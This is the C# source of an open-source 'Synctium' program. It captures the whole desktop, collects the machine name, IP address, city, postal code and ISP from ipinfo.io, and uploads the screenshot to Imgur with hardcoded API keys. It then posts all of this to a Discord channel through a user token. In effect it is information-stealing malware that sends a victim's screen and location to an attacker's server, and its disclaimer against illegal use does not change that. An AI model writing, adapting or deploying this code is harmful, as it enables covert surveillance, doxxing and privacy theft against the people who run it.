using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Script.Serialization;
using System.Drawing;
using System.IO;
using Imgur.API;
using System.Diagnostics;
using Imgur.API.Endpoints.Impl;
using Imgur.API.Authentication.Impl;
using Imgur.API.Models;
using System.Windows.Forms;

namespace Synctium_Free
{
    class Program
    {
        #region Public Strings
        public static string invite;
        public static string channelid;
        public static string empty = string.Empty;
        public static string token = "Your Token Here";
        public static string Machine_Name = string.Empty;
        public static string Country = string.Empty;
        public static string IP = string.Empty;
        public static string Location = string.Empty;
        public static string RealRegion = string.Empty;
        public static string Org = string.Empty;
        public static string City = string.Empty;
        public static string Postal;
        public static string ImgLink;
        #endregion
        #region Grab_Information
        public class IpInfo
        {
            public string Country { get; set; }
            [JsonProperty("ip")]
            public string Ip { get; set; }

            [JsonProperty("hostname")]
            public string Hostname { get; set; }

            [JsonProperty("city")]
            public string City { get; set; }

            [JsonProperty("region")]
            public string Region { get; set; }

            //[JsonProperty("country")]
            //public string Country { get; set; }

            [JsonProperty("loc")]
            public string Loc { get; set; }

            [JsonProperty("org")]
            public string Org { get; set; }

            [JsonProperty("postal")]
            public string Postal { get; set; }
        }
        #endregion
        #region Main
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Synctium is a FREE and open source program made by: Sehyn.");
            Console.WriteLine("This program shall NOT be used for ILLEGAL activities.");
            Console.WriteLine("Program is distributed as it, your usage is your own responsability.");
            Console.WriteLine("If you agree, press any key to continue othewise please close the program.");
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;

            Console.ReadKey();
            Console.Clear();
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Getting informations from client..");
            Console.WriteLine("-------------------------------------------------------------------------------------------");

            Get_Information();
        }
        #endregion
        #region Get_Information
        private static void Get_Information()
        {
            CaptureDesktop();
            Machine_Name = System.Environment.MachineName;
            IpInfo ipInfo = new IpInfo();

            string info = new WebClient().DownloadString("http://ipinfo.io");

            JavaScriptSerializer jsonObject = new JavaScriptSerializer();
            ipInfo = jsonObject.Deserialize<IpInfo>(info);

            RegionInfo region = new RegionInfo(ipInfo.Country);
            RealRegion = (ipInfo.Region);
            IP = (ipInfo.Ip);
            Org = (ipInfo.Org);
            City = (ipInfo.City);
            Postal = (ipInfo.Postal);

            //Needs fix
            if (Postal == empty)
            {
                Postal = "Not found.";
            }
            if (Postal == " ")
            {
                Postal = "Not found.";
            }
            if (Postal == "")
            {
                Postal = "Not found.";
            }
            //Console.WriteLine(Postal);
            //Console.ReadKey();

            //Console.WriteLine(RealRegion);
            //Console.WriteLine(IP);
            //Console.WriteLine(Org);
            //Console.WriteLine(City);
            //Console.WriteLine(Postal);
            //Console.WriteLine("STOP");
            //Console.ReadKey();

            //Console.WriteLine(region.EnglishName);
            if (region.EnglishName.Contains("France"))
            {
                Country = ":flag_fr:";
            }
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Sending Informations over server.");
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            UploadImage();
            Send_Information();


        }
        #endregion
        #region Capture_Desktop
        private static void CaptureDesktop()
        {
            Rectangle desktopRect = GetDesktopBounds();

            Bitmap bitmap = new Bitmap(desktopRect.Width, desktopRect.Height);

            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(desktopRect.Location, Point.Empty, bitmap.Size);

            }
            bitmap.Save("C:/Users/Public/Documents/Capture-" + DateTime.Now.ToString("yyyy-MM-dd-h-mm-tt") + ".png");
            Console.WriteLine("Capture complete!");
        }
        private static Rectangle GetDesktopBounds()
        {
            Rectangle result = new Rectangle();
            foreach (Screen screen in Screen.AllScreens)
            {
                result = Rectangle.Union(result, screen.Bounds);
            }

            return result;
        }
        #endregion
        #region Upload_Image
        private static void UploadImage()
        {
            try
            {
                var client = new ImgurClient("1dd3edbb008eae6", "e25728a4e9c674fe22994462521984d86e0172aa");
                var endpoint = new ImageEndpoint(client);
                IImage image;
                using (var fs = new FileStream(@"C:/Users/Public/Documents/Capture-" + DateTime.Now.ToString("yyyy-MM-dd-h-mm-tt") + ".png", FileMode.Open))
                {
                    image = endpoint.UploadImageStreamAsync(fs).GetAwaiter().GetResult();
                }
                Console.WriteLine("Image uploaded. Image Url: " + image.Link);
                Process.Start(image.Link);
                ImgLink = image.Link;
                //Console.ReadKey();
            }
            catch (ImgurException imgurEx)
            {
                Console.WriteLine("An error occurred uploading an image to Imgur.");
                Debug.Write(imgurEx.Message);
            }


        }
        #endregion
        #region Send_Information
        private static void Send_Information()
        {
            invite = "Your Invite Code (NOT URL)";
            channelid = "Your Channel ID";

            Discord.funcs.joinguild(token, invite, false, null);
          
            Discord.funcs.sendmessage(token, channelid, "**[Machine Name] - ** " + Machine_Name + "\r\n" + "**[Country] - ** " + Country + "\r\n" + "**[Postal Code] - ** " + Postal + "\r\n" + "**[ISP] - ** " + Org + "\r\n" + "**[IP Address] - ** " + IP + "\r\n" + "**[Capture] - ** " + ImgLink, false, false);
            //Discord.funcs.sendmessage(token, channelid, "**[Country] - ** " + Country, false, false);
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("Sent.");
            Console.WriteLine("-------------------------------------------------------------------------------------------");

            Console.ReadKey();



        }
        #endregion
    }
}
